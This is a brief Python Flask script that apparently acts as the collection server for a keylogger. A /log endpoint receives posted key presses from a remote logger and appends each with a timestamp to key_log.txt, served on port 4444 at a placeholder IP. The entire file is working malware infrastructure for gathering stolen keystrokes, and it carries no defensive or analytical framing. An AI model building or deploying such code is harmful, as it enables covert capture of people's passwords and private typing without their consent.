from flask import Flask, request, jsonify
import os
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_key_press():
    #Our logger will send the data as JSON, so we need to parse it
    data = request.get_json()
    key = data.get('key')
    timestamp = datetime.now().isoformat()

    
    #We will log the key press to a file called 'key_log.txt'

    #opens a file in append mode, so we can add new entries without overwriting the existing ones. 
    #Each entry will include the timestamp and the key that was pressed.
    #jsonify converts the response to JSON format, which is a common format for APIs.
    with open('key_log.txt', 'a') as log_file:
        log_file.write(f"{timestamp}: {key}\n")
    return jsonify({"status": "success"})

if __name__ == '__main__':
   app.run(host='YOUR-IP-ADDRESS', port=4444)